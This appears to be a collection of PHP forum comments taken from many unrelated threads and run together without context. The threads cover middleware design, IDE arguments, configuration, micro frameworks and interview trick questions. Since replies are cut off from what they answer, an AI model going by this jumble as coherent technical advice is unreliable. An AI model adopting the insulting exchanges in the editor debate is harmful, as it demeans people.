Plus, if you were to receive a $response object in the middleware alongside $request, what would be the content of $response at that moment? I like to have my responses being created on my controllers. If my controller (or inner code, or request handler, etc) has already processed, did its logic, and created a response, then it would be too late for checking for cached content. Also looking at this angle it seems that the current proposal forces you to receive a response in your controller and modify it to your needs, or else you create the response and lose information that may already have been added by middlewares. Not receiving a response in your middleware does seems a nicer solution.
Yeah, maybe a little. Sorry about that. I know I'd be interested if someone else posted it though, so I decided to share it either way.
I should note, I fully accept your point that because of a variety of PSR-7 implementations in PHP we are basically stuck with having to inject a factory if we don't pass the response as a parameter. I just think that is shitty, but I do agree it is basically the reality FIG is in... :)
People still use SublimeText for the same reason people still use Notepad++. They haven't used an IDE for long enough to be comfortable with it, or don't understand how to utilize it to be more efficient. There are some random edge cases where people have honest issues that make the IDE slow or weird to use, but most of the time they don't care enough to resolve the issue because they'd rather go back to what they're comfortable with.
Your analogy doesn't work here. It's like comparing a screwdriver with a toolkit. You want to use your screwdriver for everything, to the point that you're hammering in nails with it, when you could just use a toolkit that has everything instead. With a swiss army knife, there is a reduction in quality to cram more tools in a limited space. An IDE does not do that - that's actually what sublimetext plugins do.
&gt; PHP 5.4 &gt; Asgard uses the features of PHP 5.4 such as short array syntax, traits, "&lt;?="" and other syntactic sugar. Personally I would get rid of that from your site. Does it use any new features from PHP 7? (Curious)
Try the quickstart tutorial if you have time and let me know if it deserves the V :)
1. It doesn't. You can just open a folder. 2. What makes Komodo's debugger better than PHPStorms? 3. PHPStorm isn't slow at all unless you starve it for RAM. Java has nothing to do with anything. 4. I use PHPStorm in linux and it feels just like every native app, what are you on about?
What do you see that makes it obvious?
Thanks for your feedback. Indeed, there is still place for more refactors. The tests are in each package. For example Db/Tests. Some packages don't have tests yet. The root phpunit file just tells to go through all */Tests/ folders. Each package can be used individually, for example: https://github.com/asgardphp/validation. Symfony does the same. As for the directory structure, I need to think about it, but I'm not yet convinced. In the end there would just have an extra level (src/) and I want to keep things split by package anyway. And thank you for catching that empty link. I'll fix that.
So would you rather use symfony with the micro kernel trait for performance?
There are many useful patterns, FIFO being one of them. Which is more intuitive and useful in the php middleware context. We will just have to agree to disagree.
Show me a cPanel box without WHM installed. cPanel is the name of the company. When people with server experience say "cPanel", we are referring to both cPanel and WHM, and typically consider it unimportant to delineate which product has which functionality (since they are always installed together) unless we're trying to help someone perform some task. Phalcon is a PHP extension (i.e. it's not written in PHP), and must be compiled as such. There are Windows DLLs that can be downloaded, many Linux distros have a package available for it, and it looks like it's installable on OSX via Homebrew as well. There is a custom module at https://github.com/thecpaneladmin/EA-PhalconPHP that does in fact allow Phalcon to be installed on cPanel hosts. Obviously, this will only work if you have SSH access to the server file system and write permissions to the cPanel folders.
All the languages I use at work are supported by PHPStorm, so that's not a problem for me. Besides, that is not what this post is about.
I'm glad I don't have to work with this monstrosity ever again.
Ah! Didn't even catch the star in your path. I *was* missing something. Most repositories typically have source code in one folder and tests in another, but it's a convention more than anything. While there's nothing wrong with your current structure, the only argument I can think of against it is that contributing authors just wouldn't be used to it at first glance. /src/ and /tests/ directories are largely understood. Conforming to that would be more for other authors than anything else. But this is your baby, so if you don't like the extra directories, then no bother.
Thanks for your answer! But i need to put a whole text in here: example: http://imgur.com/m3GEglg And i dont know where to put it in the php
Nice :) One of the things that drive me nuts in laravel collections not able to pass [strings into map/reduce](https://github.com/laravel/internals/issues/83#issuecomment-218045444). Looks like this library does just that as: http://dusankasan.github.io/Knapsack/#Operations-map Nice job.
Seems to be working fine in my PSR implementation, no conflicts to report.
nice!
Um, thanks ... I guess.
Separating tests into their own folder also allows you to exclude them when creating a distributed (or "dist") version of your package. @see https://blog.madewithlove.be/post/gitattributes/ *(Note: may still be possible with `*/Tests/` matching, I haven't tested that. I just know that this is common practice.)*
Yes it works with */Tests/ and I have it: https://github.com/asgardphp/asgard/blob/master/.gitattributes
I agree, very well done.
I have both. I use Sublime text for simple edits. Sublime is great for huge text files like mysqldump output. I use PHPStorm when the extra features make my day better. PHPStorm-- best xdebug integration EVER!
Its been patched. So I don't see a problem. Magento has its issues but this aint one.
Name one Sublime Text plugin that highlights/warns a function call to an undefined function (e.g. A function that does not exist anywhere in the current project). If you ever find that, then find me a plugin that warns on an undefined method of an instantiated object, such as $foo-&gt;bar() where bar() does no exist in the class definition (or any parent extended class, or trait). I'll wait. 
There is no "push" method on `$next` because it's only a callable. You could potentially inject whatever's responsible for holding/managing your middlewares into the translator middleware's constructor so that it can push itself onto the end of the queue (*facepalm*), but there is no guarantee that other middlewares aren't doing the same thing, and displacing its position at the end of the queue - thus leading to the same problem. And, for the sake of argument, let's say we ignore all of that. What do you have now? A queue whose elements are pushing themselves onto the end so that the queue can behaviorally emulate a stack. You're going through great pains to avoid using the right architecture here.
A class with both a push method and __invoke is callable. I added my edit to show that in some cases the stack method can be beneficial, but I probably would just use two middlewares.
&gt; A class with both a push method and __invoke is callable. No, `$next` is only defined as a `callable` with the following signature in the spec: * @param callable $next delegate function that will dispatch the next middleware component: * function (RequestInterface $request, ResponseInterface $response): ResponseInterface It doesn't even have to be a class, let alone one with a `push()` method, and relying on that would almost certainly break your application.
I love poetry too!
actually, you can customize st 3 too match your need using the available plugins :)
&gt;That will double your number of middlewares Oh no? &gt;won't work for stateful middleware PSR responses allow your to pass data along if you need to. Besides if you can advocate removing response from $next, surely I can advocate adding a requeue option as standard. You can continue to push middlewares that modify the response last first while I will do the opposite.
Also, my collection library, based on the APIs from some other languages: https://github.com/danielgsims/php-collections
That's cool and all, but this is the php subreddit, so nobody really cares what Java does or doesn't do and that doesn't add anything to the discussion. 
Symfony has great configuration: http://symfony.com/doc/current/cookbook/configuration/environments.html All your configuration is external and contained as part of the application. The thing that most people get wrong though is that they commit their `parameters_dev.yml` and/or `parameters_prod.yml` files, you want to `.gitignore` these. The `parameters.yml` (which you do commit) contains "defaults" for each of the parameters that can be set but obviously it shouldn't contain actual values for things such as keys. You use `parameters_dev.yml` and/or `parameters_prod.yml` to override defaults specified in `parameters.yml`. The first time you clone a project you need to set up your `parameters_dev.yml`. Easy. Not sure how you'd do this in Zend Framework or Laravel though, I think all configuration is done through PHP and environment variables like you describe. The configuration system is "one" of the (many) reasons I use Symfony. 
Ofcouse php-go will support PHP7. There are some code about PHP7, but not feature complete.
My environment is still very vanilla, though I'm trying to start using vim more for heavy development. Currently I use it for modifying config files without issue, but I haven't gotten comfortable with navigating visual mode yet, so I still tend to use Geany for PHP. The biggest thing keeping me from using tools like PHPStorm or Sublime is my commitment to free software, though they also sound resource intensive and I tend to enjoy keeping my system lightweight (...sent from Chromium. :-P)
Well the software isn't slow for 99% of the people that use it, so if it's not your computer, then obviously there's a PEBCAK error.
Yeah, totally me. Sublime isn't faster or anything. PHPStorm for life. I'm an idiot who hasn't tested any of this stuff. Java is overlord. Java is faster then native languages, never slower.
You are missing one simple fact. There are separate cli tools that can do all those checks. There are people who are comfortable with dropping to a cli to do it, or automate those checks with version control hooks. In that way, you don't get hogged by all these stuff going on in the background messing with your text editing/navigating, which according to me, is a much better use of your resources. That was why I said some people use a toolkit with separate tools, instead of a swiss army knife.. It is ok if you are not one of those guys. But trying to discredit a software because it does not work according to your preference is quite chidish.
Yaml, unfortunately. Because it doesn't support Jin: https://github.com/dotink/jin
You are asking for the Gravatar website? https://www.gravatar.com/ https://www.gravatar.com/avatar/02f8a1876759ad0sf215055ff17cc318?r=pg&amp;s=100 or see the body of the function gravatar() to change http to https?
Try to publish this as a composer package. Then the install command would be `composer global install intrd/php-docbloc`, and then run by `~/.composer/vendor/bin/docbloc`. Error handling would be good to add.
I used to do that for the last 4 years (it is also what ZF2 does by default, btw): * `.gitignore` with `*.local.php` * `db.local.php`, `mailer.local.php` deployed to dev/staging/prod * local config built as part of the deployment process This works fine until you get to work with containers that get built with your data, but breaks down horribly after that due to the nature of containers (immutable FS). Having local config in a separate location also helps, but now you have to build an entire volume to share with your app containers, and that just for the configs. This approach also complicates deployment procedures by a lot, since you have to assemble files and push them as part of a deployed volume. This means that the deployment environment needs to know about production parameters =&gt; no good. I ended up moving to environment vars due to all of the above, and it works really, really, really well. Makes sysop happy, makes deployment process happy, makes me happy: easier to run the same compiled containers against dev/staging/e2e-testing *environments*. I see where you come from: I took similar decisions to the ones made by the Symfony team when designing around the ZendFramework config system, but don't blindly take that approach as "the way". As an exercise (and to learn something fun about their deployment system) try deploying a Symfony app to Heroku: you will both enjoy it (the transactional deployment process is really smooth, and you may use Dokku if you can't deploy to "the cloud") and see how all of the above makes perfect sense.
Are they writing the database in PHP?
Serious question; what are micro frameworks useful for? 
Really interesting read. I'm currently overusing repositories by a lot, but every repository is not a single-method invokable class. That makes this sort of approach (specification objects pushed around) a natural fit: final class FindUserByNickname { public function __invoke(FindUserByNicknameSpecification $findUser) { /* ... */ } } I've seen prooph doing something similar with the "query bus", by the way ( https://github.com/prooph/service-bus#messaging-api ), but I'm still distancing myself from trying out that shiny feature (already using too many shiny features).
Maybe it's just a smart move to target the PHP market as clients.
Nice one :)
/r/arraysgonewild
To be honest if you want to improve adoption I would go with PHP7 support. You're new so it'll be greenfield projects using it so PHP7 will just be a box to check.
Whilst I agree, how is a person new to PHP supposed to know that? Why can't whoever runs that website recognise that the entire comment section is harmful?
Plus some authorship details (name + email) and the project name I guess. 
While the content is reasonable for beginners, your title is appalling. After the first popup I closed the site. If this is a post targeting house wives and 15 year olds that would work. As a Web Dev I'm incredibly sensitive to bad UX and marketing bullshit. I know I'm not alone in this. 
&gt;You're using a text editor as a development environment to begin with.. No. My development environment is the whole OS and every program that can run on it. Most often those are cli programs, which I can run is a separate buffer in neovim...So there is no "cramming plugins" to make it work like an IDE. Even if you cannot run it in a buffer inside your editor, it does not matter if you have learned to switch to a cli and recall a command from history buffer and run it in the blink of an eye. Faster than you can remember and press the short cut key in your bloated IDE (or painfully select it using the mouse from a menu list that is a million lines long and nested to god-knows-howmany levels) and it slowly opening the window... To make more clear, I am not interested in the "Integrated" part in IDE. I have a DE with a million tools that I can call any of them with a complexity of O(1), from a cli, with frequently used ones with their options nicely aliased, in a configuration file I can literally drop into any development server I choose, and feel right at home there... Try doing it with your IDE!
Hi C00yt825, Title is good you can check it whole post ! after you can write it bad UX and marketing bullshit !
IMO, they are useful for having common things you need to write a modern web app (routing, HTTP request/response cycle, Dependency Container/Injection, Middleware), without needing all the extras that come out the box with a full framework (ORM, session handling, a bunch of helpers etc). Also, microframeworks are easier to write code which is less reliant on framework specific implementations, unlike something similiar Laravel, which you sometimes code to the framework, giving you tightly coupled code. I much prefer using micro frameworks, my personal favorite being Slim. The start of Slim's docs says it all for me: &gt;Slim is a PHP micro framework that helps you quickly write simple yet powerful web applications and APIs. At its core, Slim is a dispatcher that receives an HTTP request, invokes an appropriate callback routine, and returns an HTTP response. Thats it.
That's funny. Because my experience with micro frameworks is that you end up reinventing everything that already comes out of the box with a "full-stack" framework and that on-top of that you end up with a pile of crap no one understands except you. I.e. I say micro frameworks are bullshit. 
&gt;No. My development environment is the whole OS and every program that can run on it. No, that's your operating system. An operating system is not a development environment. You claim you're "not interested in the Integrated" part but don't realize how backwards your sentence right after that is - oh, you can drop a config file into any server you choose? Right, after you install all of your tools... instead of one IDE. It's clear from everything you're saying that you're very stuck in your ways and don't even understand the purpose of an IDE. Everything you've mentioned is doable in my IDE - including cli commands that I can run with a single keystroke. No one using an IDE has to take time remembering shortcuts any more than you have to take time to remember your cli arguments. Face it - you're just a whiner that doesn't understand how to use technology out of your comfort zone.
most likely not. but maybe they want it to be PHP-developer friendly so hiring someone with the PHP knowledge will help towards this.
I would say if you're creating a pile of crap that no one else can understand, you are doing it wrong.
That's very interesting. Thanks a lot I did not know that there are websites like www.codementor.io I will definitely have a look. To answer your questions I work in a small agency and we are stuck on developing Wordpress websites. Which is not bad but recently we had to pass couple of large projects that had to be build on a framework because we don't have people in house who know any new frameworks.
this is just spammy shite
I would still use atom because I like to have the same environment at all my devices and because i honestly prefer open source
This is Magento 2, not Magento 1.
WTF is this shit: http://i.imgur.com/p21gy7h.png. Why do you make it so hard to click the back button on your web site? 1. The short tag &lt;?= is always enabled, even if short_open_tag is off 2. You should be using autoloaders these days, not manually including files 5. Hungarian notation is not required PHP, just use a decent IDE 9. "marginally faster" is not a good reason to do something, readability and maintainability is key for become a better developer 14. Or you can use xDebug 15. You can use the built-in php functions for this You really need to pick up a framework, and stop using "pure php". Your tips are a little out of date
&gt;No, that's your operating system... Well, that is the point. You have all the tools you need there. But you want to use inferior/bloated versions of the same "RIGHT THERE IN MY IDE" and "I WANT THEM RUNNING AT EVERY 5 OF MY KEYSTROKES" &gt;Right, after you install all of your tools... instead of one IDE... Eh..I was talking about online servers. But I guess you didn't ever have to work directly in a server, right? &gt;It's clear from everything you're saying that you're very stuck in your ways and don't even understand the purpose of an IDE. That might have been true if I hadn't used an IDE ever. But I started with 'IDE's when the majority of Php programmers were writing code in Notepad. There is not one IDE that I haven't tried (Netbeans, Eclipse etc etc), but I eventually ended up with VIM. At some point, you will see that the whole IDE business is pointless. I mean, if you are not too stuck in *your* ways, and keep and open mind... &gt;Everything you've mentioned is doable in my IDE - including cli commands that I can run with a single keystroke... Great. But then your IDE is then full of bloated, redundant stuff. &gt;No one using an IDE has to take time remembering shortcuts any more than you have to take time to remember your cli arguments. But your IDE is still bloated. And it takes more time for your bloated IDE to open up the window to respond to your command. So you can learn dozens of shortcuts for your IDE, but if it takes a couple of seconds to open up the window, all that is lost.... but that is not even the point. The point is, you don't actually need that crap. You only think you need it. &gt;Face it - you're just a whiner that doesn't understand how to use technology out of your comfort zone. Ok. name calling. I guess I can start now. You call me a whiner. I call you a wannabe. A wannabe 'professional' who use 'professional tools' only to make himself feel good and belonged. Because you are insecure to boot. (Because may be, you work in a language which the whole world considers to be a joke, so lots of insecurty. Anymore "DAE love Php" threads?) And you call that technology? Technology is not about making inferior versions of existing tools and putting them all together in a god forsaken bloated piece of crap.. Face it. It is not called technology. It is called marketing. And you have all been taken for a ride...because you are a bunch of wannbes too easy to pass by without milking $$$ before you actually grow up (if you ever do)
JIRA, basically because I am that used to it.
Looks like phpstorm to me
I guess you haven't read the post, because that is what I am currently doing, but I would like to understand what DDD is, and how I can implement it. 
Team Support because the tech support department head picked it. It's not at all what I would have picked. No integration with dev tools, horrible search. Meh.
&gt;You are missing one simple fact. There are separate cli tools that can do all those checks. There are people who are comfortable with dropping to a cli to do it, or automate those checks with version control hooks. I really wish there was, but sorry there is no cli tool that gives you this feature I mentioned. If there was I'd add it to our CI to *catch all the bugs written by developers not using a proper ide*. Still waiting on this magical tool/plugin that checks undefined functions project wide. 
`&lt;? ?&gt;` might be a problem, but `&lt;?= ?&gt;` is absolutely fine, shorter, less verbose, easier to read and the only point where it creates a problem is when it's inside an XML file that gets dynamically rendered (which can always be fixed by just echo'ing the XML processing instruction.
Same here, used Sublime Text for a full year professionally. But a lot of time was wasted because there was no built-in step through debugger, and lack of solid code intelligence (project wide). 
Why? His point is to not use `$_REQUEST`. It's not wrong to use `$_GET` and `$_POST` just because your framework abstracts it in a request object for you. `$_GET` and `$_POST` are the official way of accessing request data. Your request abstractions use it as well (mostly). They just tell you you filter it.
Looks really good.
To learn Laravel you have the well written [documentation](https://laravel.com/docs/5.2) and the amazing [Laracasts](https://laracasts.com). Laravel Valet or Homestead make it very easy to install and it uses Symfony components.
My agency provided me with a 16GB 2015 Macbook Pro, but I still had to bring my own licenses for PHPStorm and Sublime Text. I have been using ST3 for about three years now, and I have it customized to the point of where it is nearly as functional as a full IDE. I've tried to get into using PHPStorm several times in the past, but compared to Sublime Text it feels clunky and counter-intuitive, plus it is slower at startup (which seems to get better with each new version). With the new e-commerce platform that I am now getting into, I will have to use PHPStorm for the IDE features that it offers so I guess I will have to get used to it.
Do yourself a huge favor and [just read this](http://www.amazon.com/Domain-Driven-Design-Tackling-Complexity-Software/dp/0321125215).
If the project is not very big, rather use Silex (Symfony) or Lumen (Laravel). It's saves you a ton of setup and configuration time.
I see some differences with PhpStorm though: rounded corners for scrollbars, different identation for line numbers, and it's a different icon for the code expand/collapse arrows.
"general manager of AWS NoSQL Group"
After completing the main article I've got several requests to clarify some issues with fetching objects in PDO. So I did. Nothing really impressive though, just some clarifications and couple gotchas. But given that there was no such article around before, I think it worth the trouble. As usual I hope to get some feedback from this great community, which comments always helped me a lot to improve the articles.
My former employer used Basecamp and their product suit, but I'm now using Jira, and love it. Code is hosted on bitbucket, and we use some other Atlassian products too. It costs a little bit, and somewhat slow and the UI is 2013-ish. It works well regardless, and has quite nice integration with bitbucket. 
Silex is my go-to right now. I have my custom skeleton project and just copy it when I want to start something quickly. There's also a basic [Silex skeleton](https://github.com/silexphp/Silex-Skeleton) available.
Ok, I will order the book, filling my paypal account right now .. though I'm kinda newbie so I doubt it won't do much except leave me confused. In the mean time, can you just provide any example for the DDD implementation? Thanks. 
The idea is just relying on composer.json file to generate headers, whether the user has not installed the Composer.. and generate docbloc even in projects that do not use PHP as a language. Yes, I will add some error handling! thanks for advice!
In the refactoring example in the sample chapter, the author comes up with this: function githubScore($username) { $url = "https://api.github.com/users/{$username}/events"; $events = collect(json_decode(file_get_contents($url), true)); return $events-&gt;pluck('type')-&gt;map(function ($eventType) { return collect([ 'PushEvent' =&gt; 5, 'CreateEvent' =&gt; 4, 'IssuesEvent' =&gt; 3, 'CommitCommentEvent' =&gt; 2, ])-&gt;get($eventType, 1); })-&gt;sum(); } Is this really considered more readable than a simpler solution, like say: function githubScore($username) { $url = "https://api.github.com/users/{$username}/events"; $events = json_decode(file_get_contents($url), true); $scores = [ 'PushEvent' =&gt; 5, 'CreateEvent' =&gt; 4, 'IssuesEvent' =&gt; 3, 'CommitCommentEvent' =&gt; 2, ]; $score = 0; foreach ($events as $event) { $score += $scores[$event['type']] ?? 1; } return $score; } It's 3 lines longer (excluding empty lines), but at least I personally would prefer this code over the author's solution.
No, that's how hiring programmers always goes. Most of them seem to be completely incompetent. Remember this whenever you get an offer and are negotiating your pay!
But when exactly? Both consist of a simple composer-command. You could always `class __ extends SomeOtherCollectionImplementation {}` and be all like `__::create([1, 2, 3])-&gt;map(..)-&gt;reduce(..)`
My favorite question is "Is it possible to send an HTTP request using both POST and GET methods at once?" And a second one, "what is the outcome of the following code:" &lt;?php echo "&lt;img src="; http://example.com/img.png echo "&gt;"; 
I'm not that evil.
No.
It's possible to pass data via the url which is then stored in the $_GET superglobal, and POST data in the request body which then is accessed via the $_POST superglobal.
nope, you fail for not knowing the closing `?&gt;` in a file is optional
I'm always surprised when I talk to someone in a senior role and come to find out they have very little practical knowledge or experience. I'm curious about the 4 incorrect answers - were they unable to provide an answer at all, or did they supply incorrect answers? It's the incorrect answers that intrigue me. Even if you had never touched a line of programming in your life, it seems the most logical guess here would be 3.
What do you think, would you get that job?
Good stuff. Nicely done.
That would be a great interview to see how candidates handle stress
Why is it bad practice? I knew it was optional, but I always do it..
Hmm.. If there's no error, that would mean that it sees that it's a url or something.. Because any regular text in that spot would most certainly generate an error..
I interview maybe 50-60 a year (always on the lookout for a good dev) and you would be shocked at what I get. Simple questions like how do you get the length of a string stumps senior level developers. &amp;nbsp; Of the 50-60 I interview maybe 10 will make it to round 2 which is coding on a computer a small project. Of those maybe 1 wont be a complete fuckup. My standards have gone down also, I'll hire now somebody I would never hire in the past just because there is so little talent available. PS: I pay TOP $$$$$ for my developers and still crap
Or, you know, just 10^7 :)
Follow up question, what is the type of floor(3.1)?
 http: This is a target point. See [goto documentation](http://php.net/manual/en/control-structures.goto.php). The rest of the line is considered as a comment.
Why do you think those guys have an issue with floor()? I see more than that which might be totally unclear for somebody who never touched PHP. Also let's assume the issue is floor. Imagine those guys have a financial background where they would never ever turn values into approximations. Maybe hiring such people for your ecommerce margin calculations will save the company lots of money compared to an average PHP developer.
Because the http: resembles a [goto](http://php.net/manual/en/control-structures.goto.php) thing and the // before example comments the rest out. Took some time to figure this out haha
Totally floored by that
is 'floor' not rather common in most langs?
That's better indeed, but the point is clear. ;-)
Yeah, sneaky indeed. That's why I like it :) And it took me a while too, first time.
Because its easy to have accidental white space after the closing marker which can be a source of bugs. Never close a php tag unless you mean to use the space after it specifically.
And who would you hire then, those guys with `goto` experience or those who never used such a construct?
Ok, I must admit it that I didn't know goto's could be used this way. Though, I must confess that I've never in my entire career have used goto's either, nor have I read the manual for it. The comment part is pretty obvious once understanding the goto. Thank you, for a good and easy humiliation.
Interesting, I didn't know : was the shortcode for goto. makes sense now, tries to goto somewhere called http then the following // "inline comment gets ignored" so technically it only echos &lt;img src=&gt;
Interesting. Thanks.
Ok, that second one is just plain and simply nasty! :P It spins on the fact that (from my experience) goto's are never used.
So what's the purpose of this question then? I found that question actually quiet smart to filter out those guys who did touch goto.
You've misunderstood goto: http://se2.php.net/manual/en/control-structures.goto.php
Just try to imagine that you've worked the past 10 years in all possible technolgies, but never ever PHP in your life. Do you think such guys exist and would call them self senior developer? Could you imagine that this "&lt;?php" might not reveal its intention to said class of developer?
That's utterly pathetic.
Disclaimer: I'm a developer at heart, not an expert with hiring new devs. I have conducted about 50 interviews/technical screenings in the past 18 months. Whether another developer knows what a given PHP method does to me doesn't matter very much. Google only takes a second and frankly, they may have just not used it in a while. I... * discuss high level topics to measure their understanding of bigger concepts (high availability, replication, testing, concurrency, etc.) * always request a code sample. Specifically I want to see 3-4 classes that was written by them and is a representation of the code they want to write in the near future. I've learned after 50 interviews that the code sample speaks louder as to someone's technical ability than anything I can ask in an interview. Anyone can put OOP on their resume, but few can deliver a code sample that demonstrates an understanding of the SOLID principles. This also allows a dev the opportunity to put thought into what they submit and deliver their best. * like to find out what they're opinionated about in regards to testing, standards (PSR, json-api, etc.), documentation, etc. Someone too opinionated can be an issue among the team. Someone not opinionated enough probably either doesn't know enough or may have trouble upholding standards the team agrees to. **Edit:** Some of the best developers we have hired have been people with no foreknowledge of PHP, but experienced in another language.
One day when you're working on a massive project with 600 classes and all the PHP processed images on your site stop working because if one space character after a ?&gt; you'll change your mind.
Every
One of those tools should likely be syntax highlighting, eliminating the need to be able to lex arbitrary code like this.
&gt; "Is it possible to send an HTTP request using both POST and GET methods at once?" A PHP dev who has seen both `$_GET` and `$_POST` populated in the same request will reflexively answer, "Yes", although the question is actually about the HTTP standard which only uses one verb at a time. This sort of trick question is useless at judging actual competence.
I would assume it solves some new problem or existing problems in a novel way. That or AWS just really wants to get more proprietary software in the game.
I think the better point would be "why would you do this?" GET requests are generally supposed to be idempotent while POST requests are usually not, so mixing the two is usually an indication of a flawed design.
&gt;One day when you're working on a massive project with 600 classes ... and the project will have a style guide that says that the closing PHP tag has to be omitted. It'll be all fine.
Title: Four out of five senior developers don't know the answer to this simple question... Buzzfeed, FTFY =)
There is a problem with the actual incompetence of PHP developers. Who in general are quite ignorant about any standards. But some of them are curious enough to inquiry, what HTTP or POP3 or an ordered map is, and that's a sure bonus.
Here is a problem a actually encounter during my job (twice). &lt;?php class Test { // ?&gt; } echo "test"; Could you predict the outcome?
That's a good question for the following discussion. 
Correct answer! Want a job? "use($number_of_users)" was the solution we were looking for. (Some applicants sadly suggested globals)
I wouldn't want it. I loathe these kinds of questions in interviews and don't give them myself because they look to see if an interviewee can deduce the answer you're looking for rather than being specific in your question. I don't want to know if you can manage to be clever in your responses in a rehearsed process, I want to know that you can lucidly explain your reasoning on why you write code the way that you do and whether or not you understand fundamental concepts of software design.
AFAIK, the new MongoDB (3.3?) has joins.
Damn that's a good one. Sadly none of my applicants were of that level.
Rule of thumb, if you try to catch people out with random bits of knowledge you most likely will succeed. Because then it's not about their knowledge but it's about your ability to catch people out that is being tested.
&gt;Whether another developer knows what a given PHP method does to me doesn't matter very muc I am OP and I 100% agree on this. I don't expect a dev to be a PHP dictionary this was just one of a set of softball questions at the start to get the applicants warmed up and confident I was just surprised at how few actually knew the answer.
That's a terrible question. If your IDE isn't garbage it will indicate to you the variable is out of scope and therefore make it obvious it has to be use'd or (heaven forbid) globalized. You'd do far better asking what are the proper situations in which to *use* use and which cases are indications of an underlying flaw in the design of your code.
We use are an agile company which means we allow our developers to use whatever tools they wish to get the job done. Many don't use IDEs which is fine by me so long as their work is good. The question is also about the developers problem solving ability and how ingrained a concept such as this is in their mind, especially as we use anonymous functions extensively.
&gt;Simple questions like how do you get the length of a string stumps senior level developers. Bytes or characters?
We just do a simple skype interview with a slideshow for the first one then once pared down we give a simple task.
They were "senior" developers.
I should write clickbait for a living.
And because a random 3rd party site tells you to not do something it's "just not done anymore"? As long as it's in the official definition it's not a failure in any test if it's not defined via any kind of style guide.
First one is easy: No, but we can send param through POST and query strings to simulate both GET and POST The second one: I would have never guessed it right.
If this was the requirement for every senior dev position, I'd be a senior software architect at google by now.
Don't be stupid. It's characters. Bytes are measure of volume.
Cool, I'm glad we can agree that we shouldn't work together :)
This is an interesting attitude which I often see on Stack Overflow. "It works and I don't care". Unfortunately, if you don't care, it doesn't work.
I'm sorry what. What did the other 4 say?
I mentor juniors not seniors. I expect my seniors to be up and running day 1. Juniors have 3 months without a single deliverable, purely learning. They get throw away projects that will teach them how I like things done and expose them to the business 
PSR is universally considered to be the de facto industry standard. Many repositories will reject non PSR compliant code. http://www.php-fig.org/psr/psr-2/ &gt;The closing ?&gt; tag MUST be omitted from files containing only PHP.
Thatwasthejoke.blade.php
It would be really interesting to see the actual class you're talking about. Private is not evil in any way and you mostly use it for a good reason. If there's some kind of bug, tell the author or send a pull request. If it's something that shouldn't really be private, do the same. Just send him a pull request. If he doesn't accept your PR, create a fork, change it, put it on packagist. You usually use private at points where it's not about extensibility, but core functionality ("Flattening an input array", "validate input arguments" etc.)
Seems a lot of them have never used a floor() function in any language. Maybe they never had to do a lot of math processing through their careers?
Don't forget about multibyte strings as well ;)
Yes, this is how many people see this.
Ah! That's funny. I thought it would've just been a syntax error... Either way it doesn't do what it's intended to do. 
Do you need remote people? 
Closing PHP files with ?&gt; is not bad practice. Assuming that omitting ?&gt; will save you from errors is bad practice. Good code review and security is a first priority over that. PHP developers will tell me, "Omitting the closing tag will prevent hackers from injecting HTML into your PHP files on disk." To which I respond, "If they can modify files on disk you are already screwed and closing tags are not a concern." As for white space appearing after the closing tag this is something that should be caught either in pull request code reviews, a testing server, and any sort of other checks such as a git pre-commit hook. Which is the same as ensuring a coding style such as a no closing tag with a blank new line at the end of the file.
Yes. It'll output test. IIRC commented out php closing tags are considered comments. Maybe. Probably. 
Good thing I'm already a senior software engineer.
I've been using so many libraries handling my database for me, I actually didn't even know about `PDO::FETCH_CLASS` and now I feel like an asshole.
Really, cause I am :X
Senior PHP Developers or Node.JS developers?
echo returns nothing? It is not a function it is a statement?
You do know he didn't write PHP in PHP, right? he's a C developer...
its about something basic that if you want to become good at your job you have to move to something better. i don't think any good chef would advice you to use garlic powder for example
Well we write all of our code to PSR-2, which isn't that difficult.
Fair enough. I do freelance stuff online now, which is super easy to get gigs, but a lot of it is not the most exciting and challenging. It does beat working at an office tho. 
&gt; how ingrained a concept such as this is in their mind, especially as we use anonymous functions extensively The syntax for anonymous functions varies from language to language and once a developer encounters this error once it is incredibly easy to avoid in the future. Testing a candidate's ability to spot syntax errors isn't going to provide information on their skill as an engineer.
It's nifty, but if I'm not using an ORM to build objects from the database, I'm either using arrays or objects that receive their attributes via the constructor, so it's a bit useless for me. :(
Why not give a high-level design question where there are multiple options and none is a clear winner? Asking questions about the behavior of poorly written code or trying to trick your candidates is a good way to *drive people away*.
Wait, PHP has goto statements? 
The problem I have with people claiming PSR/PSR-2 is the "de facto industry standard" since it gives people the idea that it is. It creates problems such as the people that come along to Github projects proclaiming that all the code needs to be refactored since it does not match PSR-2. I work primarily in MediaWiki code bases so it can not follow PSR-2 guide lines.
I suggest humane euthanasia... and a proper beating.
I looked at it and thought "3". Started reading the comments then actually had to check. &gt; sketch@albion ~ $ php -a &gt; Interactive mode enabled &gt; &gt; php &gt; echo floor(3.1); &gt; 3 &gt; php &gt; 
echo is a statement. Shoddy code usually has it like `echo($foo)`. Shoddy code also has `require(), require_once(), include()` and `include_once()`. They are statements. Not functions.
All comments are generic without any spam.
Lol
http://inviqa.com/training-courses/ do some really good courses, to be honest with these guys I would suggest any of their courses. They also do Symfony training under their brand Sensiolabs UK. 
By no means, shockingly enough my favorite language is c# but I wouldn't apply for a senior c# job as for the last 5 years I've been doing php and c. Now if I did I'd spend a few days going over some old code and even code something to get back in the groove. Now my current needs are senior php developers so you should expect php questions. Don't know why you find it hard to understand that I would eliminate anybody who doesn't fit my needs even if their overall experience is good. For the dollars I'm paying I want a developer that is up and running day 1
You can look at Behat I'm pretty sure v3 had a lot of DDD in it. For the most part DDD is generally done on in house applications where it's worth the money doing it. Even looking at code you won't recognise the concepts until you learn about DDD.
`floor(3.1)` is `3.00` because the return would be a `float`. Calling `gettype` on it would return `"double"`. Running `floor(3.1) === 3` returns false unless you cast them to correct types, but running `floor(3.1) === 3.00` returns true.
ehh, I think if I see the code I would recognize the concepts, as I have been asking this question for many years, and every either tells you to read some book, or see some code. I'm really curious if people know it just by name and not actually implementation. 
That's why there is an echo in front of it, it is 3.
YAML - I'm not a huge fan of annotation mappings. In addition, PHPStorm will actually strip out your use statements during code cleanup if you enable "optimize imports". There are plugins which address this issue but it just feels like a workaround. Annotation mappings also defeat the purpose of using a Data Mapper which allows you to decouple your Entities from the ORM. 
So your expecting a developer to have memorized the ever changing php api? As a developer, unless I am doing mathematical programming all day (and lets face it with php one is more likely to be processing text strings than math) I would not bother memorizing things that I can quickly look up unless I was using it all day. I would find an answer of "I dont know, but I know how to RTFM", to be an acceptable answer.
&gt; And a second one, "what is the outcome of the following code:" My answer: "employment termination."
I've only used them a few times, but anyone with a decent amount of experience building anything has likely come across floor() or ceil(). I would think. Then again, we are usually only exposed to what we are required to complete the task at hand.
